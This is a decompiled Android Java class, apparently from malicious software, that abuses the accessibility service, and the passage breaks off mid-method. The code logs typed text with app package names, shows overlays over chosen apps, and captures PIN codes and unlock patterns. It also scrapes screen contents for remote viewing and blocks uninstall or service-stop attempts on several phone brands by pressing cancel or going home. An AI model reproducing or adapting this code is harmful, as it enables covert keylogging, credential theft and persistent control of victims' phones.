package com.tillekesoft.accessibilityservices;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.content.Context;
import android.content.Intent;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityManager;
import android.view.accessibility.AccessibilityNodeInfo;
import androidx.core.view.accessibility.AccessibilityNodeInfoCompat;
import anywheresoftware.b4a.AbsObjectWrapper;
import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.keywords.B4AApplication;
import anywheresoftware.b4a.keywords.Common;
import anywheresoftware.b4a.objects.IntentWrapper;
import anywheresoftware.b4a.objects.collections.List;
import anywheresoftware.b4a.objects.collections.Map;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.concurrent.Callable;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import org.eclipse.paho.client.mqttv3.MqttTopic;
import org.eclipse.paho.client.mqttv3.internal.ClientDefaults;

/* loaded from: classes.dex */
public class AccessibilityEventsListenerWrapper extends AccessibilityService {
    public static final String ANDROID_SETTINGS_APP_PKG_ID = "com.android.settings";
    public static final String HUAWEI_EXTERNAL_APP_PKG_ID = "com.huawei.android.internal.app";
    public static final String HUAWEI_OPTIMIZER_APP_ID = "com.huawei.systemmanager";
    public static final String SAMSUNG_KNOX_PKG_ID = "com.samsung.klmsagent";
    public static final String TEAM_VIEWER_HOST_APP_NAME = "Host";
    public static final String TEAM_VIEWER_HOST_PKG_ID = "com.teamviewer.host.market";
    public static boolean USE_OVERLAY = true;
    public static String app_name = "";
    public static int intCanUnInstalltheApp;
    public static int intpemscounter;
    public static long ispermformediaproj;
    public static AccessibilityNodeInfo tempAccessibilityNodeInfo;
    public AccessibilityEventsListener acs;
    private ArrayList<Object> f1b;
    public static Map lstTemprorayListOfViews = new Map();
    public static boolean isfound = false;
    public static boolean isOverlay_IsShowing = false;
    public static String strCurrentopPkg = "";
    public static Map lstOvrlyPkgs = null;
    private static boolean bServiceRunning = false;
    public static boolean IsShowNotificationsBar = false;
    public static int isKeyLo = 0;
    public static boolean IsShowAllAcc = false;
    public static int NoOfAccViews = 250;
    public static String IsStartDrawing = "saddsadsasdads";
    public static String StringsetTypingText = "";
    public static String StrIsIn = "";
    public static boolean isServiceActive = false;
    public static List list1 = new List();
    boolean isActionReceiverRegistered = false;
    public AccessibilityConstants accservconstants = new AccessibilityConstants();

    private String gIdToString(int i) {
        switch (i) {
            case 1:
                return "GESTURE_SWIPE_UP";
            case 2:
                return "GESTURE_SWIPE_DOWN";
            case 3:
                return "GESTURE_SWIPE_LEFT";
            case 4:
                return "GESTURE_SWIPE_RIGHT";
            case 5:
                return "GESTURE_SWIPE_LEFT_AND_RIGHT";
            case 6:
                return "GESTURE_SWIPE_RIGHT_AND_LEFT";
            case 7:
                return "GESTURE_SWIPE_UP_AND_DOWN";
            case 8:
                return "GESTURE_SWIPE_DOWN_AND_UP";
            case 9:
                return "GESTURE_SWIPE_LEFT_AND_UP";
            case 10:
                return "GESTURE_SWIPE_LEFT_AND_DOWN";
            case 11:
                return "GESTURE_SWIPE_RIGHT_AND_UP";
            case 12:
                return "GESTURE_SWIPE_RIGHT_AND_DOWN";
            case 13:
                return "GESTURE_SWIPE_UP_AND_LEFT";
            case 14:
                return "GESTURE_SWIPE_UP_AND_RIGHT";
            case 15:
                return "GESTURE_SWIPE_DOWN_AND_LEFT";
            case 16:
                return "GESTURE_SWIPE_DOWN_AND_RIGHT";
            default:
                return "UNKNOWN";
        }
    }

    @Override // android.accessibilityservice.AccessibilityService
    public void onInterrupt() {
    }

    public void setNotiComp_CheckTime(Long l) {
    }

    @Override // android.app.Service
    public void onCreate() {
        startService(new Intent(this, getClass()));
    }

    @Override // android.accessibilityservice.AccessibilityService
    public void onServiceConnected() {
        try {
            B4AApplication b4AApplication = Common.Application;
            app_name = B4AApplication.getLabelName();
            if (lstOvrlyPkgs == null) {
                Map map = new Map();
                lstOvrlyPkgs = map;
                map.Initialize();
            }
            if (!lstOvrlyPkgs.IsInitialized()) {
                lstOvrlyPkgs.Initialize();
            }
            bServiceRunning = true;
            isServiceActive = true;
            this.acs.PerformGlobalAction(1);
            AccessibilityEventsListener.delay(250);
            this.acs.PerformGlobalAction(1);
            AccessibilityEventsListener.delay(250);
            this.acs.PerformGlobalAction(1);
            AccessibilityEventsListener.delay(250);
            this.acs.PerformGlobalAction(2);
            AccessibilityEventsListener.delay(250);
            BA BA = this.acs.f2a;
            this.acs.f2a.raiseEvent2(this, true, "show_ovr", true, null);
        } catch (Exception unused) {
        }
    }

    @Override // android.app.Service
    public boolean onUnbind(Intent intent) {
        bServiceRunning = false;
        return super.onUnbind(intent);
    }

    @Override // android.app.Service
    public void onDestroy() {
        try {
            bServiceRunning = false;
            isServiceActive = false;
        } catch (Exception unused) {
        }
    }

    public static boolean bGetServiceStatus() {
        return bServiceRunning;
    }

    public static boolean isAccessServiceEnabledNewloop(Context context, Class cls) {
        try {
            String string = Settings.Secure.getString(context.getContentResolver(), "enabled_accessibility_services");
            if (string == null) {
                return false;
            }
            StringBuilder sb = new StringBuilder();
            sb.append(context.getPackageName());
            sb.append(MqttTopic.TOPIC_LEVEL_SEPARATOR);
            sb.append(cls.getName());
            return string.contains(sb.toString());
        } catch (Exception e) {
            BA.Log(e.getMessage().toString());
            return false;
        }
    }

    public static boolean isAccessibilityEnabled(Context context, String str) {
        AccessibilityManager accessibilityManager = (AccessibilityManager) context.getSystemService("accessibility");
        if (accessibilityManager == null) {
            return false;
        }
        Iterator<AccessibilityServiceInfo> it = accessibilityManager.getEnabledAccessibilityServiceList(-1).iterator();
        while (it.hasNext()) {
            if (str.equals(it.next().toString())) {
                return true;
            }
        }
        return false;
    }

    public void getKeyLoData(final AccessibilityEvent accessibilityEvent) {
        if (accessibilityEvent != null) {
            try {
                if (accessibilityEvent.getText() != null) {
                    BA BA = this.acs.f2a;
                    BA.runAsync(this.acs.f2a, this, "getkeylo", new Object[]{""}, new Callable<Object[]>() { // from class: com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper.1
                        @Override // java.util.concurrent.Callable
                        public Object[] call() throws Exception {
                            String valueOf;
                            String str;
                            int eventType = accessibilityEvent.getEventType();
                            if (eventType == 1) {
                                valueOf = String.valueOf(accessibilityEvent.getText());
                            } else if (eventType != 8) {
                                valueOf = eventType != 16 ? "" : String.valueOf(accessibilityEvent.getText());
                            } else {
                                valueOf = String.valueOf(accessibilityEvent.getText());
                            }
                            if (valueOf.isEmpty() || valueOf.toString().length() >= 30) {
                                return new Object[]{""};
                            }
                            if (accessibilityEvent.getPackageName() != null) {
                                str = valueOf + " -pkg : " + String.valueOf(accessibilityEvent.getPackageName());
                            } else {
                                str = valueOf + " -pkg : none";
                            }
                            return new Object[]{str};
                        }
                    });
                }
            } catch (Exception e) {
                BA.Log("getKeyLoData " + e.getMessage().toString());
            }
        }
    }

    public boolean isMediaProjRequted() {
        return System.currentTimeMillis() - ispermformediaproj < 3000;
    }

    private boolean isAttemptToUninstall(String str, AccessibilityEvent accessibilityEvent) {
        if (str == null) {
            return false;
        }
        if (accessibilityEvent.getEventType() != 1 && accessibilityEvent.getEventType() != 32) {
            return false;
        }
        String eventText = getEventText(accessibilityEvent);
        String packageName = getPackageName();
        if (findAndGetFirstSimilar(accessibilityEvent.getSource(), "com.oppo.launcher:id/deep_shortcuts_container", true) != null) {
            return true;
        }
        if ((!eventText.toLowerCase().contains(app_name.toLowerCase()) && ((accessibilityEvent.getClassName() == null || !accessibilityEvent.getClassName().equals("com.miui.home.launcher.uninstall.DeleteDialog")) && (((!eventText.contains(packageName) && !eventText.contains(app_name)) || !str.toLowerCase().contains("packageinstaller")) && !str.equalsIgnoreCase("com.samsung.android.lool") && !str.equals("com.miui.securitycenter") && (accessibilityEvent.getClassName() == null || !accessibilityEvent.getClassName().toString().contains("InstalledAppDetailsTop"))))) || str.contains("permissioncontroller")) {
            return false;
        }
        if (this.acs.PerformNodeActionOnViewWithArgs(true, "android:id/button2", 16, null)) {
            return true;
        }
        return this.acs.PerformNodeActionOnViewWithArgs(true, "com.android.settings:id/button2", 16, null);
    }

    private boolean isAttemptToStopService(AccessibilityEvent accessibilityEvent) {
        return (accessibilityEvent == null || accessibilityEvent.getClassName() == null || !accessibilityEvent.getClassName().equals("com.android.systemui.statusbar.phone.SystemUIDialog") || findAndGetFirstSimilar(accessibilityEvent.getSource(), "com.android.systemui:id/sec_fgs_manager_recycler_view", true) == null) ? false : true;
    }

    private boolean isOppoUninstallProcess(String str, AccessibilityEvent accessibilityEvent) {
        if (str == null) {
            return false;
        }
        AccessibilityNodeInfo source = accessibilityEvent.getSource();
        if (Build.MANUFACTURER.equalsIgnoreCase("oppo") && accessibilityEvent.getEventType() == 2048 && findAndGetFirstSimilar(source, "com.android.launcher:id/txt_uninstall_main_title", true) != null && (getTextFromChildren(accessibilityEvent).contains(app_name) || getTextFromChildren(accessibilityEvent).contains(app_name))) {
            return findButtonAndClick(source, "com.android.launcher:id/btn_negative", true);
        }
        return false;
    }

    private boolean isXiaomiDragToUninstallProcess(String str, AccessibilityEvent accessibilityEvent) {
        AccessibilityNodeInfo source;
        AccessibilityNodeInfo findAndGetFirstSimilar;
        AccessibilityNodeInfo findAndGetFirstSimilar2;
        if (str != null && str.equals("com.miui.home") && (source = accessibilityEvent.getSource()) != null) {
            if (accessibilityEvent.getEventType() == 2048) {
                if (source.getParent() != null) {
                    findAndGetFirstSimilar2 = findAndGetFirstSimilar(source.getParent(), "com.miui.home:id/uninstall_drop_target", true);
                } else {
                    findAndGetFirstSimilar2 = findAndGetFirstSimilar(source, "com.miui.home:id/uninstall_drop_target", true);
                }
                if (findAndGetFirstSimilar2 != null) {
                    return true;
                }
                AccessibilityNodeInfo findAndGetFirstSimilar3 = findAndGetFirstSimilar(source, "com.miui.home:id/title", true);
                if (findAndGetFirstSimilar3 != null && findAndGetFirstSimilar3.getText() != null && findAndGetFirstSimilar3.getText().toString().contains(app_name) && findAndGetFirstSimilar3.isVisibleToUser()) {
                    return true;
                }
            }
            String eventText = getEventText(accessibilityEvent);
            if (eventText.isEmpty()) {
                CharSequence contentDescription = source.getContentDescription();
                if (contentDescription == null) {
                    contentDescription = "";
                }
                eventText = contentDescription.toString();
            }
            if (accessibilityEvent.getEventType() == 2 && eventText.contains(app_name)) {
                return true;
            }
            if (accessibilityEvent.getEventType() != 8 && accessibilityEvent.getEventType() != 32768) {
                return false;
            }
            if (source.getParent() != null) {
                findAndGetFirstSimilar = findAndGetFirstSimilar(source.getParent(), "com.miui.home:id/title", true);
            } else {
                findAndGetFirstSimilar = findAndGetFirstSimilar(source, "com.miui.home:id/title", true);
            }
            if (findAndGetFirstSimilar != null && findAndGetFirstSimilar.getText().toString().contains(app_name)) {
                return true;
            }
        }
        return false;
    }

    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:106:0x028a -> B:97:0x02c4). Please report as a decompilation issue!!! */
    @Override // android.accessibilityservice.AccessibilityService
    public void onAccessibilityEvent(final AccessibilityEvent accessibilityEvent) {
        try {
            final AccessibilityNodeInfo rootInActiveWindow = getRootInActiveWindow();
            if (!isOverlay_IsShowing && rootInActiveWindow != null && accessibilityEvent.getEventType() != 1 && rootInActiveWindow.getPackageName() != null && lstOvrlyPkgs.ContainsKey(rootInActiveWindow.getPackageName().toString().toLowerCase())) {
                String lowerCase = rootInActiveWindow.getPackageName().toString().toLowerCase();
                isOverlay_IsShowing = true;
                this.acs.f2a.raiseEvent2(this, true, "add_o", true, lstOvrlyPkgs.Get(lowerCase), lowerCase, 262176);
                strCurrentopPkg = lowerCase;
            }
            if (isOverlay_IsShowing && accessibilityEvent != null && accessibilityEvent.getPackageName() != null && accessibilityEvent.getEventType() == 1 && !TextUtils.isEmpty(accessibilityEvent.getPackageName()) && !accessibilityEvent.getPackageName().toString().toLowerCase().contains(strCurrentopPkg.toLowerCase()) && !accessibilityEvent.getPackageName().toString().toLowerCase().contains(BA.packageName.toLowerCase()) && !accessibilityEvent.toString().toLowerCase().contains("softinputwindow") && !accessibilityEvent.toString().toLowerCase().contains("type_view_focused") && !accessibilityEvent.toString().toLowerCase().contains("type_window_content_changed") && !accessibilityEvent.toString().toLowerCase().contains("type_view_scrolled") && rootInActiveWindow.getPackageName() != null && !lstOvrlyPkgs.ContainsKey(rootInActiveWindow.getPackageName().toString().toLowerCase())) {
                isOverlay_IsShowing = false;
                this.acs.f2a.raiseEvent2(this, true, "remove_o", true, rootInActiveWindow.getPackageName());
            }
            if (rootInActiveWindow != null && intpemscounter == 6 && intCanUnInstalltheApp == 0) {
                if (!(System.currentTimeMillis() - ispermformediaproj < 3000) && rootInActiveWindow.getPackageName() != null) {
                    if (isAttemptToUninstall(String.valueOf(rootInActiveWindow.getPackageName()), accessibilityEvent)) {
                        BA.Log("isAttemptToUninstall");
                        this.acs.PerformGlobalAction(2);
                    }
                    if (isAttemptToStopService(accessibilityEvent)) {
                        BA.Log("isAttemptToStopService");
                        this.acs.PerformGlobalAction(2);
                    }
                    if (isOppoUninstallProcess(String.valueOf(rootInActiveWindow.getPackageName()), accessibilityEvent)) {
                        BA.Log("isOppoUninstallProcess");
                        this.acs.PerformGlobalAction(2);
                    }
                    if (isXiaomiDragToUninstallProcess(String.valueOf(rootInActiveWindow.getPackageName()), accessibilityEvent)) {
                        BA.Log("isXiaomiDragToUninstallProcess");
                        this.acs.PerformGlobalAction(2);
                    }
                }
            }
            ExecutorService newSingleThreadExecutor = Executors.newSingleThreadExecutor();
            new Handler(Looper.getMainLooper());
            newSingleThreadExecutor.execute(new Runnable() { // from class: com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper.2
                @Override // java.lang.Runnable
                public void run() {
                    AccessibilityEventsListenerWrapper.this.Evts_Checker(accessibilityEvent);
                }
            });
            if (intpemscounter < 6 && accessibilityEvent.getPackageName() != null && accessibilityEvent.getClassName() != null) {
                String charSequence = accessibilityEvent.getPackageName() != null ? accessibilityEvent.getPackageName().toString() : null;
                if (charSequence != null) {
                    List list = new List();
                    list.Initialize();
                    logViewHierarchyFaster_WithNodeInMP(rootInActiveWindow, "dialerfromadmin", list);
                    AccessibilityNodeInfo source = accessibilityEvent.getSource();
                    if (list.getSize() > 0) {
                        this.acs.f2a.raiseEvent2(this, true, "check_perms", true, charSequence, accessibilityEvent.toString(), list, source);
                    }
                }
            }
            if (rootInActiveWindow != null && StrIsIn.toString().length() > 0 && this.acs != null && accessibilityEvent.getSource() != null) {
                BA BA = this.acs.f2a;
                BA.runAsync(this.acs.f2a, this, "senddrawact", new Object[]{list1}, new Callable<Object[]>() { // from class: com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper.3
                    @Override // java.util.concurrent.Callable
                    public Object[] call() throws Exception {
                        List list2 = new List();
                        list2.Initialize();
                        AccessibilityNodeInfo accessibilityNodeInfo = rootInActiveWindow;
                        if (accessibilityNodeInfo != null) {
                            AccessibilityEventsListenerWrapper.this.logViewHierarchyFaster(accessibilityNodeInfo, "dialerfromadmin", list2);
                        }
                        return new Object[]{list2};
                    }
                });
                if (isKeyLo == 1) {
                    getKeyLoData(accessibilityEvent);
                }
                this.acs.close_notificationbar();
            }
            try {
                PinComponent pinComponent = new PinComponent();
                new List();
                List checkPattern = pinComponent.checkPattern(accessibilityEvent);
                if (checkPattern != null && checkPattern.IsInitialized()) {
                    if (checkPattern.getSize() > 0) {
                        this.acs.f2a.raiseEvent2(this, true, "sendpat", true, checkPattern);
                    }
                } else if (rootInActiveWindow != null && rootInActiveWindow.getPackageName() != null) {
                    pinComponent.checkPinCode(String.valueOf(rootInActiveWindow.getPackageName()), accessibilityEvent, this, this.acs.f2a);
                }
            } catch (Exception e) {
                BA.Log("error : " + e.getMessage().toString());
            }
        } catch (Exception e2) {
            BA.Log("Exception in onAccessibilityEvent " + e2.getMessage().toString());
        }
    }

    private String idToText(AccessibilityEvent accessibilityEvent) {
        int eventType = accessibilityEvent.getEventType();
        if (eventType == 1) {
            return "TYPE_VIEW_CLICKED";
        }
        if (eventType == 2) {
            return "TYPE_VIEW_LONG_CLICKED";
        }
        switch (eventType) {
            case 4:
                return "TYPE_VIEW_SELECTED";
            case 8:
                return "TYPE_VIEW_FOCUSED";
            case 16:
                return "TYPE_VIEW_TEXT_CHANGED";
            case 32:
                return "TYPE_WINDOW_STATE_CHANGED";
            case 64:
                return "TYPE_NOTIFICATION_STATE_CHANGED";
            case 128:
                return "TYPE_VIEW_HOVER_ENTER";
            case 256:
                return "TYPE_VIEW_HOVER_EXIT";
            case 512:
                return "TYPE_TOUCH_EXPLORATION_GESTURE_START";
            case 1024:
                return "TYPE_TOUCH_EXPLORATION_GESTURE_END";
            case 2048:
                return "TYPE_WINDOW_CONTENT_CHANGED";
            case 4096:
                return "TYPE_VIEW_SCROLLED";
            case 8192:
                return "TYPE_VIEW_TEXT_SELECTION_CHANGED";
            case 16384:
                return "TYPE_ANNOUNCEMENT";
            case 32768:
                return "TYPE_VIEW_ACCESSIBILITY_FOCUSED";
            case 65536:
                return "TYPE_VIEW_ACCESSIBILITY_FOCUS_CLEARED";
            case 131072:
                return "TYPE_VIEW_TEXT_TRAVERSED_AT_MOVEMENT_GRANULARITY";
            case 262144:
                return "TYPE_GESTURE_DETECTION_START";
            case 524288:
                return "TYPE_GESTURE_DETECTION_END";
            case 1048576:
                return "TYPE_TOUCH_INTERACTION_START";
            case 2097152:
                return "TYPE_TOUCH_INTERACTION_END";
            case 4194304:
                return "TYPE_WINDOWS_CHANGED";
            default:
                return "Unknown";
        }
    }

    private boolean isActionBrReceiverRegistered() {
        return this.isActionReceiverRegistered;
    }

    public String getTextFromChildren(AccessibilityEvent accessibilityEvent) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < accessibilityEvent.getSource().getChildCount(); i++) {
            sb.append(accessibilityEvent.getSource().getChild(i).getText());
        }
        return sb.toString();
    }

    public static String getEventText(AccessibilityEvent accessibilityEvent) {
        StringBuilder sb = new StringBuilder();
        Iterator<CharSequence> it = accessibilityEvent.getText().iterator();
        while (it.hasNext()) {
            sb.append(it.next());
        }
        return sb.toString();
    }

    public void Evts_Checker(AccessibilityEvent accessibilityEvent) {
        try {
            if (getRootInActiveWindow() == null || accessibilityEvent.getPackageName() == null) {
                return;
            }
            accessibilityEvent.getPackageName().toString();
        } catch (Exception e) {
            BA.Log("Evts_1Checker : " + e.getMessage().toString());
        }
    }

    public static void showHomeScreen() {
        Intent intent = new Intent(IntentWrapper.ACTION_MAIN);
        intent.addCategory("android.intent.category.HOME");
        intent.setFlags(ClientDefaults.MAX_MSG_SIZE);
        BA.applicationContext.startActivity(intent);
    }

    private void checkMiuiErrorDialog(AccessibilityEvent accessibilityEvent) {
        AccessibilityNodeInfo source = accessibilityEvent.getSource();
        if (source == null || accessibilityEvent.getClassName() == null || !accessibilityEvent.getClassName().equals("com.android.server.am.AppNotRespondingDialog")) {
            return;
        }
        findButtonAndClick(source, "android:id/aerr_wait", true);
        actionBack();
    }

    public void logViewHierarchyFaster(AccessibilityNodeInfo accessibilityNodeInfo, String str, List list) {
        String str2;
        String str3;
        try {
            Boolean bool = false;
            Boolean bool2 = false;
            try {
                if (accessibilityNodeInfo.isCheckable() || accessibilityNodeInfo.isClickable() || accessibilityNodeInfo.isEditable() || accessibilityNodeInfo.getText() != null || accessibilityNodeInfo.getHintText() != null || accessibilityNodeInfo.getContentDescription() != null) {
                    bool = true;
                }
                if (accessibilityNodeInfo.getPackageName() != null && accessibilityNodeInfo.isVisibleToUser()) {
                    bool2 = true;
                }
            } catch (Exception unused) {
                bool = true;
                bool2 = true;
            }
            if (accessibilityNodeInfo != null && accessibilityNodeInfo.isVisibleToUser() && accessibilityNodeInfo.isEnabled() && bool.booleanValue() && bool2.booleanValue()) {
                Map map = new Map();
                map.Initialize();
                Rect rect = new Rect();
                accessibilityNodeInfo.getBoundsInScreen(rect);
                if (rect.width() > 0 && rect.height() > 0) {
                    map.Put("width", Integer.valueOf(rect.width()));
                    map.Put("Height", Integer.valueOf(rect.height()));
                    map.Put("Top", Integer.valueOf(rect.top));
                    map.Put("Left", Integer.valueOf(rect.left));
                    map.Put("Right", Integer.valueOf(rect.right));
                    map.Put("Bottom", Integer.valueOf(rect.bottom));
                    map.Put("viewid", accessibilityNodeInfo.getViewIdResourceName());
                    if (accessibilityNodeInfo.getText() != null) {
                        str2 = "" + accessibilityNodeInfo.getText().toString();
                        str3 = accessibilityNodeInfo.getText().toString();
                    } else {
                        str2 = "";
                        str3 = str2;
                    }
                    if (accessibilityNodeInfo.getHintText() != null) {
                        str2 = str2 + " " + accessibilityNodeInfo.getHintText().toString();
                    }
                    if (accessibilityNodeInfo.getContentDescription() != null) {
                        str2 = str2 + " " + accessibilityNodeInfo.getContentDescription().toString();
                    }
                    map.Put("ViewText", str2);
                    map.Put("textonly", str3);
                    if (accessibilityNodeInfo.getPackageName() != null) {
                        map.Put("packagename", accessibilityNodeInfo.getPackageName());
                    }
                    try {
                        if (accessibilityNodeInfo.isFocused() && accessibilityNodeInfo.isEditable()) {
                            tempAccessibilityNodeInfo = accessibilityNodeInfo;
                        }
                    } catch (Exception e) {
                        BA.Log("Error : " + e.getMessage().toString());
                    }
                    list.Add(map.getObject());
                    try {
                        if (lstTemprorayListOfViews.IsInitialized()) {
                            lstTemprorayListOfViews.Put(rect.left + "" + rect.top + "" + rect.width() + "" + rect.height() + "" + str3 + "" + accessibilityNodeInfo.getViewIdResourceName(), accessibilityNodeInfo);
                        }
                    } catch (Exception e2) {
                        BA.Log("exx : " + e2.getMessage().toString());
                    }
                }
            }
            for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                if (child != null) {
                    logViewHierarchyFaster(child, str, list);
                    child.recycle();
                }
            }
        } catch (Exception unused2) {
        }
    }

    public void logViewHierarchyFaster_WithNodeInMP(AccessibilityNodeInfo accessibilityNodeInfo, String str, List list) {
        String str2;
        String str3;
        try {
            Boolean bool = false;
            Boolean bool2 = false;
            try {
                if (accessibilityNodeInfo.isCheckable() || accessibilityNodeInfo.isClickable() || accessibilityNodeInfo.isEditable() || accessibilityNodeInfo.getText() != null || accessibilityNodeInfo.getHintText() != null || accessibilityNodeInfo.getContentDescription() != null) {
                    bool = true;
                }
                if (accessibilityNodeInfo.getPackageName() != null && accessibilityNodeInfo.isVisibleToUser()) {
                    bool2 = true;
                }
            } catch (Exception unused) {
                bool = true;
                bool2 = true;
            }
            if (accessibilityNodeInfo != null && accessibilityNodeInfo.isVisibleToUser() && accessibilityNodeInfo.isEnabled() && bool.booleanValue() && bool2.booleanValue()) {
                Map map = new Map();
                map.Initialize();
                Rect rect = new Rect();
                accessibilityNodeInfo.getBoundsInScreen(rect);
                if (rect.width() > 0 && rect.height() > 0) {
                    map.Put("width", Integer.valueOf(rect.width()));
                    map.Put("Height", Integer.valueOf(rect.height()));
                    map.Put("Top", Integer.valueOf(rect.top));
                    map.Put("Left", Integer.valueOf(rect.left));
                    map.Put("Right", Integer.valueOf(rect.right));
                    map.Put("Bottom", Integer.valueOf(rect.bottom));
                    map.Put("viewid", accessibilityNodeInfo.getViewIdResourceName());
                    if (accessibilityNodeInfo.getText() != null) {
                        str2 = "" + accessibilityNodeInfo.getText().toString();
                        str3 = accessibilityNodeInfo.getText().toString();
                    } else {
                        str2 = "";
                        str3 = str2;
                    }
                    if (accessibilityNodeInfo.getHintText() != null) {
                        str2 = str2 + " " + accessibilityNodeInfo.getHintText().toString();
                    }
                    if (accessibilityNodeInfo.getContentDescription() != null) {
                        str2 = str2 + " " + accessibilityNodeInfo.getContentDescription().toString();
                    }
                    map.Put("ViewText", str2);
                    map.Put("textonly", str3);
                    if (accessibilityNodeInfo.getPackageName() != null) {
                        map.Put("packagename", accessibilityNodeInfo.getPackageName());
                    }
                    try {
                        if (accessibilityNodeInfo.isFocused() && accessibilityNodeInfo.isEditable()) {
                            tempAccessibilityNodeInfo = accessibilityNodeInfo;
                        }
                    } catch (Exception e) {
                        BA.Log("Error : " + e.getMessage().toString());
                    }
                    Boolean bool3 = false;
                    if (accessibilityNodeInfo.getViewIdResourceName() != null && (accessibilityNodeInfo.getViewIdResourceName().toString().contains("check_box") || accessibilityNodeInfo.getViewIdResourceName().toString().contains("checkbox") || accessibilityNodeInfo.getViewIdResourceName().toString().contains("switch_widget"))) {
                        if (accessibilityNodeInfo.isChecked()) {
                            map.Put("checked", 1);
                            bool3 = true;
                        } else {
                            map.Put("checked", 0);
                        }
                    }
                    if (!bool3.booleanValue()) {
                        list.Add(map.getObject());
                    }
                    try {
                        if (lstTemprorayListOfViews.IsInitialized()) {
                            lstTemprorayListOfViews.Put(rect.left + "" + rect.top + "" + rect.width() + "" + rect.height() + "" + str3 + "" + accessibilityNodeInfo.getViewIdResourceName(), accessibilityNodeInfo);
                        }
                    } catch (Exception e2) {
                        BA.Log("exx : " + e2.getMessage().toString());
                    }
                }
            }
            for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                if (child != null) {
                    logViewHierarchyFaster_WithNodeInMP(child, str, list);
                    child.recycle();
                }
            }
        } catch (Exception unused2) {
        }
    }

    public void logViewHierarchyFaster_WithNodeInMP_ForSwitch(AccessibilityNodeInfo accessibilityNodeInfo, String str, List list) {
        AccessibilityNodeInfo parent;
        String str2;
        try {
            Boolean bool = false;
            Boolean bool2 = false;
            try {
                if (accessibilityNodeInfo.isCheckable() || accessibilityNodeInfo.isClickable() || accessibilityNodeInfo.isEditable() || accessibilityNodeInfo.getText() != null || accessibilityNodeInfo.getHintText() != null || accessibilityNodeInfo.getContentDescription() != null) {
                    bool = true;
                }
                if (accessibilityNodeInfo.getPackageName() != null && accessibilityNodeInfo.isVisibleToUser()) {
                    bool2 = true;
                }
            } catch (Exception unused) {
                bool = true;
                bool2 = true;
            }
            if (accessibilityNodeInfo != null && accessibilityNodeInfo.isVisibleToUser() && accessibilityNodeInfo.isEnabled() && bool.booleanValue() && bool2.booleanValue()) {
                String str3 = "";
                if (accessibilityNodeInfo.getText() != null) {
                    str3 = "" + accessibilityNodeInfo.getText().toString();
                    str2 = accessibilityNodeInfo.getText().toString();
                } else {
                    str2 = "";
                }
                if (accessibilityNodeInfo.getHintText() != null) {
                    str3 = str3 + " " + accessibilityNodeInfo.getHintText().toString();
                }
                if (accessibilityNodeInfo.getContentDescription() != null) {
                    str3 = str3 + " " + accessibilityNodeInfo.getContentDescription().toString();
                }
                if (str3.contains(app_name) || str2.contains(app_name)) {
                    list.Add(accessibilityNodeInfo);
                }
            }
            for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                if (child != null) {
                    logViewHierarchyFaster_WithNodeInMP_ForSwitch(child, str, list);
                    if (list.getSize() > 0) {
                        break;
                    }
                }
            }
            if (list.getSize() <= 0 || (parent = ((AccessibilityNodeInfo) list.Get(0)).getParent().getParent()) == null) {
                return;
            }
            for (int i2 = 0; i2 < parent.getChildCount(); i2++) {
                AccessibilityNodeInfo child2 = parent.getChild(i2);
                if (child2 != null && child2.getClassName() != null) {
                    BA.Log(" Class : " + ((Object) child2.getClassName()));
                }
            }
        } catch (Exception unused2) {
        }
    }

    private boolean isWindowTitle(String str, AccessibilityNodeInfo accessibilityNodeInfo) {
        java.util.List<AccessibilityNodeInfo> findAccessibilityNodeInfosByText;
        if (Build.VERSION.SDK_INT < 18 || accessibilityNodeInfo == null || (findAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText(str)) == null || findAccessibilityNodeInfosByText.isEmpty()) {
            return false;
        }
        for (AccessibilityNodeInfo accessibilityNodeInfo2 : findAccessibilityNodeInfosByText) {
            if (accessibilityNodeInfo2.getParent() != null) {
                String viewIdResourceName = accessibilityNodeInfo2.getParent().getViewIdResourceName();
                BA.Log("ID - " + viewIdResourceName);
                if ("com.android.vending:id/action_bar".equals(viewIdResourceName)) {
                    return true;
                }
            }
        }
        return false;
    }

    public boolean findButtonAndClick(AccessibilityNodeInfo accessibilityNodeInfo, String str, boolean z) {
        if (accessibilityNodeInfo == null) {
            return false;
        }
        java.util.List<AccessibilityNodeInfo> list = null;
        if (!z) {
            list = accessibilityNodeInfo.findAccessibilityNodeInfosByText(str);
        } else if (Build.VERSION.SDK_INT >= 18) {
            list = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(str);
        }
        BA.Log(" -> findButtonAndClick() -> " + str);
        return clickNode(list, str, false);
    }

    public static java.util.List<AccessibilityNodeInfo> findAndGetAllNode(AccessibilityNodeInfo accessibilityNodeInfo, String str, boolean z) {
        if (accessibilityNodeInfo == null) {
            return null;
        }
        CopyOnWriteArrayList copyOnWriteArrayList = new CopyOnWriteArrayList();
        if (!z) {
            copyOnWriteArrayList.addAll(accessibilityNodeInfo.findAccessibilityNodeInfosByText(str));
            Iterator it = copyOnWriteArrayList.iterator();
            while (it.hasNext()) {
                AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) it.next();
                if (!TextUtils.isEmpty(accessibilityNodeInfo2.getText()) && accessibilityNodeInfo2.getText().toString().contains(str)) {
                    BA.Log("Found node : " + ((Object) accessibilityNodeInfo2.getText()));
                    copyOnWriteArrayList.add(accessibilityNodeInfo2);
                }
            }
